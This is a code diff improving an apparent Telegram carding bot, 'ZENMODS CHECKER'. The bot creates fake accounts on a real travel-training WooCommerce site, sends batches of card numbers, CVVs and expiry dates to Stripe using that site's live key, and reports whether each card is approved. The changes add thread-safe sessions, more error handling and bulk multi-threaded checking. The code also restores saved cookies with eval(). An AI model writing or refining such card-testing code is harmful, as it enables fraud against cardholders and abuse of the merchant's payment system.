@@ -17,6 +17,7 @@ authorized_users = set()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
 print_lock = threading.Lock()
+session_lock = threading.Lock()
 
 def gggggggggggggggggg(length=9, domain=None):
     common_domains = ["gmail.com"]
@@ -38,25 +39,24 @@ def create_session():
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
         }
         response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
-        html = response.text
-        soup = BeautifulSoup(html, 'html.parser')
-        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
-        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
-        headers = {
-            'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.thetravelinstitute.com',
-            'referer': 'https://www.thetravelinstitute.com/register/',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-        }
+        if response.status_code != 200:
+            return None
+        
+        soup = BeautifulSoup(response.text, 'html.parser')
+        nonce_elem = soup.find('input', {'id': 'afurd_field_nonce'})
+        noncee_elem = soup.find('input', {'id': 'woocommerce-register-nonce'})
+        
+        if not nonce_elem or not noncee_elem:
+            return None
+            
+        nonce = nonce_elem['value']
+        noncee = noncee_elem['value']
+        
         data = [
-            ('afurd_field_nonce', f'{nonce}'),
+            ('afurd_field_nonce', nonce),
             ('_wp_http_referer', '/register/'),
             ('pre_page', ''),
-            ('email', f'{email}'),
+            ('email', email),
             ('password', 'rokyNoa5954J'),
             ('wc_order_attribution_source_type', 'typein'),
             ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
@@ -74,22 +74,22 @@ def create_session():
             ('wc_order_attribution_session_pages', '8'),
             ('wc_order_attribution_session_count', '1'),
             ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
-            ('woocommerce-register-nonce', f'{noncee}'),
+            ('woocommerce-register-nonce', noncee),
             ('_wp_http_referer', '/register/'),
             ('register', 'Register'),
         ]
-        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
-        if response.status_code == 200:
-            return session
-        else:
-            return None
-    except Exception as e:
+        post_response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
+        return session if post_response.status_code == 200 else None
+    except Exception:
         return None
 
 def save_session_to_file(session, file_path):
-    with open(file_path, "w") as file:
-        cookies = session.cookies.get_dict()
-        file.write(str(cookies))
+    try:
+        with open(file_path, "w") as file:
+            cookies = session.cookies.get_dict()
+            file.write(str(cookies))
+    except Exception:
+        pass
 
 def load_session_from_file(file_path):
     try:
@@ -99,20 +99,20 @@ def load_session_from_file(file_path):
             cookies = eval(session_data)
             session.cookies.update(cookies)
             return session
-    except Exception as e:
+    except Exception:
         return None
 
 def manage_session_file():
-    session_file = "anasxzer00-session.txt"
-    if os.path.exists(session_file):
-        session = load_session_from_file(session_file)
+    with session_lock:
+        session_file = "anasxzer00-session.txt"
+        if os.path.exists(session_file):
+            session = load_session_from_file(session_file)
+            if session:
+                return session
+        session = create_session()
         if session:
+            save_session_to_file(session, session_file)
             return session
-    session = create_session()
-    if session:
-        save_session_to_file(session, session_file)
-        return session
-    else:
         return None
 
 def check_single_cc(cc_line):
@@ -135,7 +135,7 @@ def check_single_cc(cc_line):
 
         headers = {
             'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
         }
@@ -157,17 +157,23 @@ def check_single_cc(cc_line):
         }
         data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
 
-        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
-        res = response.text
+        # Using session instead of global requests.post to maintain connection pool stability
+        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
+        
+        try:
+            res_json = stripe_response.json()
+        except Exception:
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: Invalid Stripe JSON response"
 
-        if 'error' in res:
-            error = response.json()['error']['message']
-            if 'code' in error:
-                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
-            else:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
+        if 'error' in res_json:
+            error = res_json['error'].get('message', 'Unknown Stripe Error')
+            status = "CCN ✅" if 'code' in res_json['error'] else "Declined ❌"
+            return f"ZENMODS CHECKER ⚡\n{status}\n{card}\nError: {error}"
         else:
-            iddd = response.json()['id']
+            iddd = res_json.get('id')
+            if not iddd:
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: Payment method ID missing"
+
             headers_confirm = {
                 'authority': 'www.thetravelinstitute.com',
                 'accept': '*/*',
@@ -187,14 +193,17 @@ def check_single_cc(cc_line):
                 'wc-stripe-payment-type': 'card',
                 '_ajax_nonce': nonce,
             }
-            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers_confirm, data=data_confirm, timeout=20)
-            res_json = response.json()
-            if res_json.get('success') == False:
-                error = res_json['data']['error']['message']
-                if 'code' in error:
-                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
-                else:
-                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
+            confirm_response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers_confirm, data=data_confirm, timeout=20)
+            
+            try:
+                confirm_json = confirm_response.json()
+            except Exception:
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: Invalid confirmation JSON response"
+
+            if confirm_json.get('success') is False:
+                error = confirm_json.get('data', {}).get('error', {}).get('message', 'Unknown confirmation error')
+                status = "CCN ✅" if 'code' in confirm_json.get('data', {}).get('error', {}) else "Declined ❌"
+                return f"ZENMODS CHECKER ⚡\n{status}\n{card}\nError: {error}"
             else:
                 return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: Approved!"
     except Exception as e:
@@ -214,7 +223,7 @@ def process_bulk_file(chat_id, file_content):
 
     msg = bot.send_message(
         chat_id,
-        f"⚡ **Zenmods Advanced Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Initializing multi-threaded check with session & cookie management...",
+        f"⚡ **Zenmods Advanced Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Initializing multi-threaded check with thread-safe session management...",
     )
     msg_id = msg.message_id
 
